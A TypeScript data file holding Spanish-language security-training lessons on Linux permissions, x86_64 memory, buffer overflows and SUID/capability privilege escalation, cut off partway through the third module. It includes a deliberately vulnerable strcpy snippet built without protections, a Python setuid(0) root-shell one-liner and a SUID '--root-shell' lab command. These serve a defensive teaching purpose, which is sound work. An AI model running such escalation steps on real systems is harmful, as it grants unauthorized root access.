/**
 * Deep Curriculum Content Expansion for All 13 Progressive Rooms (mod-00 through mod-12)
 *
 * Adds to every single room:
 * 1. 4 Extended Deep-Dive Sub-Modules (totaling 6 comprehensive lessons per room)
 * 2. 4-Stage Technical Anatomy (Pre-condition -> Internal Mechanism -> Telemetry Artifact -> Root-Cause Fix)
 * 3. Side-by-Side Vulnerable vs. Hardened Code/Configuration Audit ("Spot & Fix the Vulnerability")
 * 4. Field Command Cheat Sheet (syntax, flag breakdown, operational use case)
 * 5. Personal Competency Badge metadata (for single-learner mastery tracking without competitive leaderboards)
 */

export interface ExtendedSubModule {
  id: string;
  lessonNumber: string;
  title: string;
  deepExplanation: string[];
  keyTakeaways: string[];
  codeOrCommandExample: string;
}

export interface AttackDefensePhase {
  phase: string;
  title: string;
  technicalDetail: string;
}

export interface VulnerableVsSecureComparison {
  title: string;
  context: string;
  vulnerableLabel: string;
  vulnerableSnippet: string;
  vulnerableWhyItFails: string;
  secureLabel: string;
  secureSnippet: string;
  secureWhyItWorks: string;
}

export interface CheatSheetCommand {
  command: string;
  flagsBreakdown: string;
  whenToUse: string;
}

export interface RoomDeepExpansion {
  moduleId: string;
  competencyBadge: {
    code: string;
    name: string;
    skillVerified: string;
  };
  extendedSubModules: ExtendedSubModule[];
  attackDefenseAnatomy: [
    AttackDefensePhase,
    AttackDefensePhase,
    AttackDefensePhase,
    AttackDefensePhase,
  ];
  vulnerableVsSecureCode: VulnerableVsSecureComparison;
  commandCheatSheet: CheatSheetCommand[];
}

export const MODULE_DEEP_EXPANSION: Record<string, RoomDeepExpansion> = {
  'mod-00': {
    moduleId: 'mod-00',
    competencyBadge: {
      code: 'CERT-00 · POSIX-FOUNDATION',
      name: 'Operador de Consola POSIX y Ética Legal',
      skillVerified: 'Navegación de sistemas de archivos Linux, lectura de permisos octales y verificación de alcance legal (Scope).',
    },
    extendedSubModules: [
      {
        id: 'mod-00-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Anatomía del Árbol de Directorios Linux (Estándar FHS)',
        deepExplanation: [
          'En Windows estás acostumbrado a ver letras de unidad como `C:\\` o `D:\\`. En Linux y sistemas UNIX (macOS, BSD, Android), todo el sistema vive bajo un único directorio raíz representado por una barra inclinada `/`. Comprender dónde se guarda cada componente conforme al Filesystem Hierarchy Standard (FHS) es vital para saber qué buscar durante una auditoría o respuesta a incidentes.',
          'Dentro de `/` existen directorios críticos con roles bien definidos: `/home/<usuario>` aloja los archivos personales de cada cuenta estándar; `/root` es el directorio exclusivo del superusuario (UID 0, inaccesible para cuentas normales); `/etc` almacena todos los archivos de configuración del sistema y servicios (como `/etc/passwd`, `/etc/ssh/sshd_config`); `/var/log` guarda los registros de auditoría y eventos de seguridad (`auth.log`, `syslog`); `/usr/bin` y `/usr/local/bin` contienen los programas ejecutables; y `/tmp` es una carpeta temporal donde cualquier usuario puede escribir (y donde muchos atacantes intentan descargar scripts).',
        ],
        keyTakeaways: [
          '`/etc`: configuraciones del sistema (nunca binarios ejecutables).',
          '`/var/log`: bitácoras de eventos e intentos de acceso (clave para Blue Team).',
          '`/tmp` y `/dev/shm`: carpetas escribibles por todos los usuarios (frecuente lugar de alojamiento de payloads temporales).',
          '`/proc`: sistema de archivos virtual en RAM con información en vivo del kernel y de cada proceso activo.',
        ],
        codeOrCommandExample:
          'pwd\nls -la /\nls -la /etc/passwd /var/log',
      },
      {
        id: 'mod-00-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Flujo de Entrada/Salida Estándar: stdin (0), stdout (1) y stderr (2)',
        deepExplanation: [
          'Cada vez que ejecutas un comando en la terminal Bash, el kernel Linux abre tres canales de comunicación llamados descriptores de archivo estándar: `stdin` (Descriptor 0, entrada por teclado), `stdout` (Descriptor 1, salida normal en pantalla) y `stderr` (Descriptor 2, mensajes de error).',
          'Esta arquitectura permite encadenar programas simples para realizar tareas avanzadas. El operador tubería (`|`, pipe) toma la salida `stdout` del comando izquierdo y la conecta como entrada `stdin` del comando derecho. El operador `>` redirige la salida a un archivo sobrescribiéndolo, `>>` añade al final del archivo sin borrar lo anterior, y `2>/dev/null` descarta silenciosamente los mensajes de error de permisos enviándolos al "agujero negro" del sistema (`/dev/null`).',
        ],
        keyTakeaways: [
          '`0` = stdin (entrada), `1` = stdout (salida normal), `2` = stderr (errores).',
          '`comando1 | comando2`: conecta la salida del primero con la entrada del segundo.',
          '`2>/dev/null`: oculta errores de "Permission denied" para limpiar los resultados de búsqueda.',
        ],
        codeOrCommandExample:
          '# Filtrar solo la línea de tu usuario en /etc/passwd:\ncat /etc/passwd | grep auditor\n\n# Redirigir errores de permisos al dispositivo nulo:\nfind / -name "*.conf" 2>/dev/null',
      },
      {
        id: 'mod-00-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Cálculo Exacto de Permisos Octales y Simbólicos en Linux',
        deepExplanation: [
          'Todo archivo o carpeta en Linux pertenece a un Usuario Propietario (`u`), a un Grupo (`g`) y tiene reglas para Otros usuarios (`o`). Cada uno de estos tres niveles posee tres bits de permiso: Lectura (`r` = valor 4), Escritura (`w` = valor 2) y Ejecución (`x` = valor 1). Si un permiso está desactivado, su valor es `0` (`-`).',
          'Para traducir cualquier permiso como `-rwxr-x---` a notación octal, sumamos cada bloque de tres por separado: Propietario `rwx` = `4 + 2 + 1 = 7`; Grupo `r-x` = `4 + 0 + 1 = 5`; Otros `---` = `0 + 0 + 0 = 0`. El resultado es `750`. Para archivos confidenciales como llaves privadas SSH (`id_ed25519`) o archivos `.env` con contraseñas, el permiso obligatorio es `600` (`-rw-------`), de modo que ningún otro usuario del servidor pueda leerlos.',
        ],
        keyTakeaways: [
          'Lectura (`r`) = 4 · Escritura (`w`) = 2 · Ejecución (`x`) = 1.',
          '`chmod 600 archivo`: solo el propietario lee y escribe (`-rw-------`).',
          '`chmod 755 script.sh`: propietario controla todo; grupo y otros solo leen y ejecutan (`-rwxr-xr-x`).',
          'En un directorio (`d`), el bit `x` significa permiso para entrar en la carpeta con `cd`.',
        ],
        codeOrCommandExample:
          '# Restringir un archivo de credenciales solo al propietario:\nchmod 600 .env\n\n# Dar permiso de ejecución a un script propio:\nchmod u+x mi_script.sh',
      },
      {
        id: 'mod-00-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Qué ocurre cuando abres una Web (DNS, IP y Puertos) y Marco Legal',
        deepExplanation: [
          'Cuando escribes un dominio como `ejemplo.com` en tu navegador, tu computador no sabe a qué cable físico enviar los paquetes. Primero consulta a un servidor **DNS (Domain Name System)** en el puerto `53`, que traduce el nombre humano a una dirección IP numérica (como `10.10.10.45` en redes privadas o `203.0.113.42` en el rango oficial de pruebas RFC 5737).',
          'Como un mismo servidor puede alojar muchos servicios simultáneamente (página web, acceso remoto SSH, base de datos), el sistema operativo utiliza **Puertos (números del 1 al 65535)** para distinguir a qué programa entregar cada conexión: `22/TCP` para SSH, `80/TCP` para HTTP sin cifrar, `443/TCP` para HTTPS cifrado y `5432/TCP` para PostgreSQL. En ciberseguridad profesional, nunca debes interactuar con una IP o puerto sin tener una autorización escrita (**Rules of Engagement y Scope**).',
        ],
        keyTakeaways: [
          'IP = dirección del edificio (servidor); Puerto = número de puerta del servicio dentro del servidor.',
          'Rangos privados RFC 1918 para laboratorios: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.',
          'Rango de documentación RFC 5737: `203.0.113.0/24` (usado para simular IPs externas sin tocar Internet real).',
        ],
        codeOrCommandExample:
          '# Ver la configuración IP de tu interfaz de red en Linux:\nip a\n\n# Comprobar tu identidad actual en el servidor:\nwhoami && id',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Error de Configuración',
        title: 'Archivo sensible creado con permisos excesivos (0666 / 0644)',
        technicalDetail: 'Un desarrollador guarda credenciales en `.env` o `config.ini` dejando el bit de lectura para "Otros" (`r--`), creyendo erróneamente que el punto inicial `.` impide que otros usuarios lo vean.',
      },
      {
        phase: 'Fase 2 · Descubrimiento Local',
        title: 'Enumeración con ls -la por cualquier usuario del sistema',
        technicalDetail: 'Cualquier cuenta con acceso básico a la consola ejecuta `ls -la` y descubre los archivos ocultos junto con su máscara de permisos abierta.',
      },
      {
        phase: 'Fase 3 · Exposición del Dato',
        title: 'Lectura directa con cat o grep',
        technicalDetail: 'Al tener permiso de lectura para otros (`r`), el comando `cat .env` imprime las claves de base de datos o tokens API en texto claro sin requerir privilegios de administrador.',
      },
      {
        phase: 'Fase 4 · Remediación POSIX',
        title: 'Aplicación de Principio de Mínimo Privilegio (chmod 600)',
        technicalDetail: 'Se revoca todo acceso al grupo y a otros mediante `chmod 600 .env` (`-rw-------`), garantizando en el kernel que solo el UID propietario pueda abrir el descriptor de archivo.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Permisos de Archivos de Credenciales y Claves SSH en Servidor Multi-Usuario',
      context: 'Un servidor Linux aloja una aplicación web cuyo archivo `.env` contiene la contraseña de producción.',
      vulnerableLabel: 'INSEGURO · Permisos abiertos al grupo y otros (0644 / 0666)',
      vulnerableSnippet:
        '$ ls -la /home/auditor/.env\n-rw-rw-r-- 1 auditor auditor 240 Nov  3 10:15 .env\n# Cualquier otro usuario local puede hacer: cat /home/auditor/.env',
      vulnerableWhyItFails:
        'El tercer bloque de permisos tiene `r--` (lectura para cualquier cuenta del servidor). Si otro servicio sufre un fallo, el atacante puede leer `.env`.',
      secureLabel: 'SEGURO (HARDENED) · Restricción estricta al propietario (0600)',
      secureSnippet:
        '$ chmod 600 /home/auditor/.env\n$ ls -la /home/auditor/.env\n-rw------- 1 auditor auditor 240 Nov  3 10:16 .env',
      secureWhyItWorks:
        'Con modo octal `0600` (`-rw-------`), el kernel deniega la llamada `open()` a cualquier proceso cuyo Effective UID no sea `auditor` (o `root`).',
    },
    commandCheatSheet: [
      {
        command: 'pwd',
        flagsBreakdown: 'Sin banderas obligatorias (Print Working Directory).',
        whenToUse: 'Al abrir una sesión terminal para confirmar tu ruta absoluta actual antes de ejecutar comandos.',
      },
      {
        command: 'ls -la',
        flagsBreakdown: '`-l` formato detallado (permisos, dueño, fecha); `-a` muestra ocultos que inician con `.`.',
        whenToUse: 'Para auditar permisos de archivos y descubrir archivos ocultos (`.ssh`, `.env`, `.bash_history`).',
      },
      {
        command: 'cd /var/log',
        flagsBreakdown: 'Ruta absoluta (`/var/log`) o relativa (`..` sube un nivel, `~` va a tu carpeta `/home`).',
        whenToUse: 'Para desplazarte entre directorios del árbol FHS de Linux.',
      },
      {
        command: 'cat bienvenida_terminal.txt',
        flagsBreakdown: 'Recibe uno o más nombres de archivo e imprime su contenido en `stdout`.',
        whenToUse: 'Para leer notas, archivos de configuración cortos y banderas sin abrir un editor interactivo.',
      },
      {
        command: 'chmod 600 clave_privada',
        flagsBreakdown: '`6` (rw-) propietario, `0` (---) grupo, `0` (---) otros.',
        whenToUse: 'Para blindar archivos de configuración sensibles y llaves privadas SSH.',
      },
    ],
  },

  'mod-01': {
    moduleId: 'mod-01',
    competencyBadge: {
      code: 'CERT-01 · X86-64-MEMORY',
      name: 'Analista de Arquitectura x86_64 y Mitigaciones ELF',
      skillVerified: 'Inspección de segmentos de memoria virtual (/proc/self/maps), registros CPU (RIP/RSP) y verificación de NX, ASLR, PIE y Stack Canary.',
    },
    extendedSubModules: [
      {
        id: 'mod-01-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Anillos de Privilegio de Hardware (Ring 0 vs. Ring 3) y Llamadas al Sistema (Syscalls)',
        deepExplanation: [
          'El procesador x86_64 impone en silicio una separación estricta entre el código de las aplicaciones (**User Mode, Ring 3**) y el núcleo del sistema operativo (**Kernel Mode, Ring 0**). Un programa en Ring 3 no tiene permiso para hablar directamente con el disco duro, la tarjeta de red ni la memoria física de otros procesos; si intenta ejecutar una instrucción privilegiada de hardware, la CPU lanza una excepción de fallo de protección general (`SIGSEGV`).',
          'Cuando un programa necesita abrir un archivo o crear una conexión de red, debe solicitarlo al Kernel mediante una **Llamada al Sistema (Syscall)**: coloca el número de syscall en el registro `RAX` (por ejemplo, `0` para `sys_read`, `1` para `sys_write`, `2` para `sys_open`, `59` para `sys_execve`), los argumentos en `RDI`, `RSI`, `RDX` y ejecuta la instrucción `syscall`. La CPU transiciona de forma controlada a Ring 0, el kernel valida los permisos del proceso y devuelve el resultado.',
        ],
        keyTakeaways: [
          'Ring 3 (Espacio de Usuario): aislamiento estricto por proceso.',
          'Ring 0 (Espacio de Kernel): acceso total a memoria física y hardware.',
          'Convención de registros en Syscalls Linux x86_64: `RAX` (n.º syscall), `RDI` (arg1), `RSI` (arg2), `RDX` (arg3).',
        ],
        codeOrCommandExample:
          '# Inspeccionar arquitectura de la CPU y banderas de seguridad (nx, smep, smap):\nlscpu',
      },
      {
        id: 'mod-01-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Prólogo y Epílogo de Función: Qué pasa en la Pila (Stack Frame) durante call y ret',
        deepExplanation: [
          'Cada vez que una función en C/C++ llama a otra mediante la instrucción `call validar_usuario`, la CPU realiza dos pasos críticos: primero empuja (`push`) en la Pila la dirección de la siguiente instrucción de la función original (**Saved RIP** o dirección de retorno) para recordar a dónde volver cuando termine, y luego salta a la nueva función.',
          'Al comenzar la nueva función se ejecuta el **Prólogo**: guarda el puntero base anterior (`push rbp`), establece la nueva base del marco actual (`mov rbp, rsp`) y resta espacio a `RSP` para alojar las variables locales (`sub rsp, 0x40`). Como la pila crece hacia direcciones de memoria menores pero los arreglos (`char buf[64]`) se escriben hacia direcciones mayores, escribir más de 64 bytes sobrescribe primero el `Saved RBP` y, justo encima, el **`Saved RIP`**. Al llegar al **Epílogo** (`leave; ret`), la instrucción `ret` extrae ese valor corrupto y lo carga en `RIP`, desviando el flujo de ejecución.',
        ],
        keyTakeaways: [
          '`call`: guarda en la pila el `Saved RIP` y salta a la subrutina.',
          '`ret`: extrae el valor en el tope de la pila (`[RSP]`) y lo carga directamente en `RIP`.',
          'El Stack Canary se inserta justo entre las variables locales y el `Saved RBP / Saved RIP` para detectar desbordamientos lineales.',
        ],
        codeOrCommandExample:
          '# Ver los segmentos de memoria virtual ([stack], [heap], [vdso]) del proceso actual:\ncat /proc/self/maps',
      },
      {
        id: 'mod-01-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Endianness (Little-Endian en x86_64) y Lectura de Volcados Hexadecimales',
        deepExplanation: [
          'Los procesadores x86_64 almacenan los enteros y punteros de memoria de múltiples bytes en formato **Little-Endian**: el byte menos significativo (LSB) se guarda en la dirección de memoria más baja. Esto sorprende a muchos estudiantes cuando inspeccionan la memoria en un depurador como `gdb` o analizan un binario.',
          'Por ejemplo, si una dirección de memoria de 64 bits es `0x00007ffc9b401234`, en la memoria RAM se almacena byte a byte en orden invertido: `\\x34\\x12\\x40\\x9b\\xfc\\x7f\\x00\\x00`. En cambio, los protocolos de red TCP/IP utilizan **Big-Endian (Network Byte Order)**, donde los bytes se transmiten de izquierda a derecha tal como los leemos.',
        ],
        keyTakeaways: [
          'x86_64 y ARM modernos usan **Little-Endian** (el byte menos significativo va primero en memoria).',
          'Las cabeceras de red (IP, TCP, UDP) usan **Big-Endian** (Network Byte Order).',
          'Las cadenas de texto ASCII (`"HOLA"`) se guardan byte a byte en orden normal independientemente del endianness.',
        ],
        codeOrCommandExample:
          '# Verificar orden de bytes y tamaños de dirección física/virtual:\nlscpu',
      },
      {
        id: 'mod-01-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Anatomía del Formato Binario ELF, PLT/GOT y Protección Full RELRO',
        deepExplanation: [
          'En Linux, todo programa compilado sigue el formato **ELF (Executable and Linkable Format)**. Cuando el binario utiliza funciones de librerías dinámicas como `printf()` o `system()` de `libc.so.6`, utiliza dos tablas internas: la **PLT (Procedure Linkage Table)** y la **GOT (Global Offset Table)**, donde se guardan los punteros a las funciones resueltas en memoria.',
          'Antiguamente, si un atacante lograba escribir en una dirección arbitraria de memoria, sobrescribía una entrada de la tabla `GOT` para redirigir una llamada a `printf()` hacia `system("/bin/sh")`. La mitigación de compilador **Full RELRO (`-Wl,-z,relro,-z,now`)** obliga al cargador dinámico a resolver todos los símbolos al inicio del programa y marca toda la tabla `GOT` como **Solo Lectura (`r--p`)** antes de ceder el control a `main()`.',
        ],
        keyTakeaways: [
          'ELF: formato estándar de ejecutables y librerías compartidas (`.so`) en Linux.',
          'GOT (Global Offset Table): tabla de punteros a funciones de librerías externas.',
          'Full RELRO: resuelve símbolos al arranque y protege la GOT en modo solo lectura (`r--p`).',
        ],
        codeOrCommandExample:
          '# Auditar todas las mitigaciones del binario ELF (RELRO, Canary, NX, PIE):\nchecksec --file=/usr/local/bin/sysdiag',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Función sin Límite',
        title: 'Uso de lectura sin control de longitud sobre un buffer en el Stack',
        technicalDetail: 'El programa reserva `char buffer[64]` en la pila pero lee la entrada del usuario con `gets()` o `strcpy()` sin comprobar cuántos bytes ingresaron.',
      },
      {
        phase: 'Fase 2 · Corrupción de Marco',
        title: 'Escritura secuencial más allá de los 64 bytes hacia direcciones altas',
        technicalDetail: 'El exceso de bytes desborda el arreglo local y alcanza la posición donde el prólogo guardó el `Saved RBP` y la dirección de retorno `Saved RIP`.',
      },
      {
        phase: 'Fase 3 · Detección / Fallo',
        title: 'Intervención de Stack Canary, NX y ASLR en el momento de ret',
        technicalDetail: 'Antes de ejecutar `ret`, el epílogo comprueba el Stack Canary; si fue alterado, aborta inmediatamente con `__stack_chk_fail`. Además, NX impide ejecutar datos en la pila (`rw-p`).',
      },
      {
        phase: 'Fase 4 · Compilación Segura',
        title: 'Reemplazo por snprintf/fgets + Flags de Hardening ELF',
        technicalDetail: 'Se limita estrictamente la copia al tamaño del buffer (`sizeof(buffer)`) y se compila con `-fstack-protector-strong`, `Full RELRO`, `NX` y `PIE` + Kernel `ASLR=2`.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Manejo de Buffers en C y Flags de Compilación Segura en GCC/Clang',
      context: 'Servicio de autenticación nativo en C que copia el nombre de usuario recibido por red a un buffer de pila.',
      vulnerableLabel: 'VULNERABLE · Copia sin límite (CWE-120 Buffer Overflow)',
      vulnerableSnippet:
        'void autenticar(const char *input_usuario) {\n    char buffer_local[64];\n    // PELIGRO: strcpy no verifica el tamaño de input_usuario\n    strcpy(buffer_local, input_usuario);\n}\n// Compilado sin protecciones: gcc auth.c -fno-stack-protector -z execstack -no-pie',
      vulnerableWhyItFails:
        '`strcpy` copia bytes hasta encontrar un byte nulo (`\\0`). Si `input_usuario` mide 120 bytes, sobrescribe el `Saved RIP` en la pila.',
      secureLabel: 'SEGURO (HARDENED) · Acotación estricta + Mitigaciones ELF Completas',
      secureSnippet:
        'void autenticar(const char *input_usuario) {\n    char buffer_local[64];\n    // SEGURO: snprintf limita la escritura al tamaño exacto de buffer_local\n    snprintf(buffer_local, sizeof(buffer_local), "%s", input_usuario);\n}\n// Compilado endurecido: gcc auth.c -O2 -D_FORTIFY_SOURCE=3 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now',
      secureWhyItWorks:
        '`snprintf` garantiza que jamás se escriban más de 63 caracteres más el terminador nulo, y los flags del compilador activan Canary, NX, PIE y Full RELRO.',
    },
    commandCheatSheet: [
      {
        command: 'cat /proc/self/maps',
        flagsBreakdown: 'Lee la tabla de páginas de memoria virtual del proceso actual en `/proc`.',
        whenToUse: 'Para verificar que `[stack]` y `[heap]` tengan permisos `rw-p` (sin el bit `x` de ejecución, confirmando NX).',
      },
      {
        command: 'checksec --file=/usr/local/bin/sysdiag',
        flagsBreakdown: '`--file=<ruta>` analiza las cabeceras ELF de un binario específico.',
        whenToUse: 'Para auditar de un vistazo si un ejecutable cuenta con `Full RELRO`, `Canary found`, `NX enabled` y `PIE enabled`.',
      },
      {
        command: 'cat /proc/sys/kernel/randomize_va_space',
        flagsBreakdown: 'Parámetro `sysctl` del kernel Linux (`0` = Off, `1` = Parcial, `2` = Full ASLR).',
        whenToUse: 'Para comprobar que el kernel aplica aleatorización total del espacio de direcciones (valor `2`).',
      },
      {
        command: 'lscpu',
        flagsBreakdown: 'Muestra arquitectura del procesador, endianness y flags de hardware (`nx`, `rdrand`).',
        whenToUse: 'Para confirmar capacidades de seguridad asistidas por hardware en el servidor.',
      },
    ],
  },

  'mod-02': {
    moduleId: 'mod-02',
    competencyBadge: {
      code: 'CERT-02 · OS-INTERNALS-PRIVESC',
      name: 'Especialista en Linux/Windows Internals y Hardening de Privilegios',
      skillVerified: 'Auditoría de binarios SUID (4000), Linux Capabilities (getcap), reglas sudoers y revocación de vectores de escalada.',
    },
    extendedSubModules: [
      {
        id: 'mod-02-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Real UID, Effective UID (EUID) y Saved UID en el Kernel Linux',
        deepExplanation: [
          'En el kernel Linux, la identidad de cada proceso dentro de su estructura `task_struct` no es un único número, sino tres identificadores distintos: **Real UID (`ruid`)**, que indica qué usuario humano lanzó originalmente el proceso; **Effective UID (`euid`)**, que es el único identificador que el kernel comprueba al decidir si permite abrir un archivo o ejecutar una operación privilegiada; y **Saved Set-User-ID (`suid`)**.',
          'Cuando un usuario normal (`auditor`, UID 1001) ejecuta un programa ordinario, `ruid = 1001` y `euid = 1001`. Sin embargo, si el archivo binario en disco tiene activado el bit **SUID (octal `4000`)** y su propietario es `root` (UID 0), el kernel mantiene `ruid = 1001` pero cambia **`euid = 0 (root)`**. Si ese binario permite ejecutar comandos del sistema o abrir una shell, el hijo hereda `euid = 0` y el usuario obtiene control total del servidor.',
        ],
        keyTakeaways: [
          'El kernel evalúa permisos de acceso basándose en el **Effective UID (`EUID`)**, no en el Real UID.',
          'Bit SUID (`4000`, visible como `s` en `-rwsr-xr-x`): asigna al proceso el EUID del propietario del archivo.',
          'Bit SGID (`2000`, `-rwxr-sr-x`): asigna el Effective GID del grupo propietario del archivo.',
        ],
        codeOrCommandExample:
          '# Buscar todos los archivos con bit SUID (4000) en todo el sistema:\nfind / -perm -4000 2>/dev/null',
      },
      {
        id: 'mod-02-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Linux Capabilities a Fondo: Conjuntos Permitted (p), Effective (e) e Inheritable (i)',
        deepExplanation: [
          'Para evitar dar todo el poder de `root` mediante el bit SUID a programas que solo necesitan un permiso puntual (por ejemplo, `ping` solo necesita abrir sockets ICMP crudos), Linux introdujo las **Capabilities**. Estas dividen los privilegios de superusuario en cerca de 40 unidades independientes como `cap_net_raw` (crear paquetes crudos), `cap_net_bind_service` (abrir puertos menores a 1024), `cap_dac_read_search` (ignorar permisos de lectura de cualquier archivo) y `cap_setuid` (cambiar arbitrariamente el UID del proceso).',
          'En cada archivo, las capacidades se configuran con banderas como `+ep`: **`p` (Permitted)** significa que el binario tiene autorizado usar esa capacidad, y **`e` (Effective)** significa que se activa automáticamente en cuanto arranca el proceso. Si un intérprete como `/usr/bin/python3.10` recibe `cap_setuid+ep`, cualquier usuario puede ejecutar `os.setuid(0)` desde Python y convertirse en `root` sin que el archivo aparezca jamás en un escaneo SUID.',
        ],
        keyTakeaways: [
          'Las Capabilities viven en atributos extendidos (`security.capability`), por lo que son invisibles para `find -perm -4000`.',
          'Siempre debes complementar la auditoría SUID con `getcap -r / 2>/dev/null`.',
          '`cap_setuid+ep` y `cap_dac_read_search+ep` en intérpretes (`python`, `perl`, `node`, `tar`) equivalen a acceso root completo.',
        ],
        codeOrCommandExample:
          '# Enumerar binarios con Linux Capabilities asignadas en el sistema:\ngetcap -r / 2>/dev/null',
      },
      {
        id: 'mod-02-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Auditoría de /etc/sudoers, Reglas NOPASSWD y Secuestro de Variables PATH / LD_PRELOAD',
        deepExplanation: [
          'El comando `sudo -l` es el primer comando que todo auditor ejecuta al obtener acceso inicial a una cuenta Linux, ya que lista qué comandos puede ejecutar el usuario actual como `root` según `/etc/sudoers`. Un error crítico de administración consiste en otorgar `NOPASSWD` sobre utilidades que permiten escapar a una shell (conocidas como **GTFOBins**, como `vim`, `less`, `find`, `awk`, `tar` o scripts editables).',
          'Otro vector clásico en binarios SUID o scripts ejecutados con `sudo` es el **PATH Hijacking**: si un programa privilegiado invoca `service` o `backup.sh` usando una ruta relativa en lugar de su ruta absoluta (`/usr/sbin/service`), un atacante puede anteponer `/tmp` a su variable `$PATH` y colocar allí un ejecutable falso con el mismo nombre.',
        ],
        keyTakeaways: [
          'Ejecuta siempre `sudo -l` al iniciar una auditoría de privilegios locales.',
          'En `/etc/sudoers`, especifica siempre rutas absolutas (`/bin/chmod`) y argumentos exactos.',
          'Nunca otorgues `sudo` sobre editores o intérpretes sin restringir la ejecución de subprocesos (`NOEXEC`).',
        ],
        codeOrCommandExample:
          '# Listar los privilegios sudo asignados a tu cuenta actual:\nsudo -l',
      },
      {
        id: 'mod-02-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Equivalentes en Windows Server: Tokens de Acceso, SeImpersonatePrivilege y Servicios sin Comillas',
        deepExplanation: [
          'En entornos corporativos Windows Server y Active Directory ocurren exactamente los mismos principios bajo nombres distintos. Cuando un usuario inicia sesión, el subsistema **LSASS (`lsass.exe`)** genera un **Access Token** con su SID, sus grupos y una lista de privilegios del sistema (`whoami /priv`).',
          'Los privilegios **`SeImpersonatePrivilege`** y **`SeAssignPrimaryTokenPrivilege`** (comunes en cuentas de servicio de IIS o SQL Server) permiten suplantar tokens de `NT AUTHORITY\\SYSTEM`. Asimismo, si un servicio de Windows que corre como `SYSTEM` tiene una ruta con espacios sin comillas (`C:\\Program Files\\App Corp\\Service.exe` — *Unquoted Service Path*) o permisos de escritura débiles (`icacls`), un usuario local puede inyectar un binario intermedio y escalar privilegios.',
        ],
        keyTakeaways: [
          '`whoami /priv` en Windows equivale a auditar capacidades y `sudo -l` en Linux.',
          '`SeImpersonatePrivilege` y `SeDebugPrivilege` son los dos privilegios de mayor riesgo de escalada a `SYSTEM`.',
          'En Linux y Windows, la remediación consiste en eliminar permisos de escritura/SUID innecesarios y usar cuentas de servicio de mínimo privilegio.',
        ],
        codeOrCommandExample:
          '# Revocar el bit SUID en Linux dejando el binario en 0755 (-rwxr-xr-x):\nchmod u-s /usr/local/bin/sysdiag',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Descubrimiento',
        title: 'Enumeración dual: SUID (find) + Capabilities (getcap) + Sudoers (sudo -l)',
        technicalDetail: 'El auditor ejecuta `find / -perm -4000 2>/dev/null` y `getcap -r / 2>/dev/null` para inventariar todos los binarios que elevan privilegios.',
      },
      {
        phase: 'Fase 2 · Identificación del Vector',
        title: 'Detección de binario no estándar con propietario root y modo 4755',
        technicalDetail: 'Se identifica `/usr/local/bin/sysdiag` con máscara `-rwsr-xr-x` (octal `4755`) perteneciente a `root` que expone la bandera interactiva `--root-shell`.',
      },
      {
        phase: 'Fase 3 · Escalada de EUID',
        title: 'Ejecución del binario SUID obteniendo Effective UID = 0 (root)',
        technicalDetail: 'Al invocar `/usr/local/bin/sysdiag --root-shell`, el kernel asigna `EUID=0` al proceso y permite leer recursos restringidos de `/root`.',
      },
      {
        phase: 'Fase 4 · Hardening del Inodo',
        title: 'Revocación del bit SUID con chmod u-s y verificación de bloqueo',
        technicalDetail: 'Se ejecuta `chmod u-s /usr/local/bin/sysdiag` (pasando de `4755` a `0755`). Al reintentar el exploit, el binario corre con `EUID=1001` y es bloqueado.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Permisos de Binarios de Diagnóstico y Capacidades en el Sistema de Archivos',
      context: 'Un equipo de operaciones instaló una herramienta de diagnóstico en `/usr/local/bin/sysdiag` y configuró Python para abrir puertos bajos.',
      vulnerableLabel: 'VULNERABLE · Bit SUID root (4755) y cap_setuid+ep en intérprete',
      vulnerableSnippet:
        '# 1. Binario con bit SUID 4000 activo (-rwsr-xr-x):\nchmod 4755 /usr/local/bin/sysdiag\n\n# 2. Capacidad excesiva otorgada al intérprete Python:\nsetcap cap_setuid+ep /usr/bin/python3.10',
      vulnerableWhyItFails:
        'El modo `4755` mantiene activo el bit SUID (`4000`), permitiendo que cualquier usuario ejecute `sysdiag` como `root`. Y `cap_setuid+ep` en Python permite hacer `python3 -c "import os; os.setuid(0); os.system(\'/bin/sh\')"`.',
      secureLabel: 'SEGURO (HARDENED) · Permiso estándar 0755 (u-s) y remoción de capacidades',
      secureSnippet:
        '# 1. Revocar el bit SUID dejando permisos 0755 (-rwxr-xr-x):\nchmod u-s /usr/local/bin/sysdiag\n\n# 2. Eliminar capacidades peligrosas del intérprete:\nsetcap -r /usr/bin/python3.10',
      secureWhyItWorks:
        '`chmod u-s` limpia el bit 4000 en el inodo (dejándolo en `0755`), y `setcap -r` elimina el atributo extendido `security.capability`.',
    },
    commandCheatSheet: [
      {
        command: 'find / -perm -4000 2>/dev/null',
        flagsBreakdown: '`/` desde raíz; `-perm -4000` filtra bit SUID activo; `2>/dev/null` oculta errores de permiso.',
        whenToUse: 'Para descubrir todos los ejecutables SUID en el servidor durante una auditoría de escalada.',
      },
      {
        command: 'getcap -r / 2>/dev/null',
        flagsBreakdown: '`-r /` busca recursivamente desde la raíz atributos `security.capability`.',
        whenToUse: 'Indispensable porque los binarios con Linux Capabilities NO aparecen con `find -perm -4000`.',
      },
      {
        command: 'sudo -l',
        flagsBreakdown: '`-l` lista las reglas de `/etc/sudoers` permitidas para el usuario actual.',
        whenToUse: 'Para comprobar si puedes ejecutar algún comando específico como `root` sin contraseña (`NOPASSWD`).',
      },
      {
        command: '/usr/local/bin/sysdiag --root-shell',
        flagsBreakdown: 'Invoca el binario SUID personalizado identificado en `/usr/local/bin/`.',
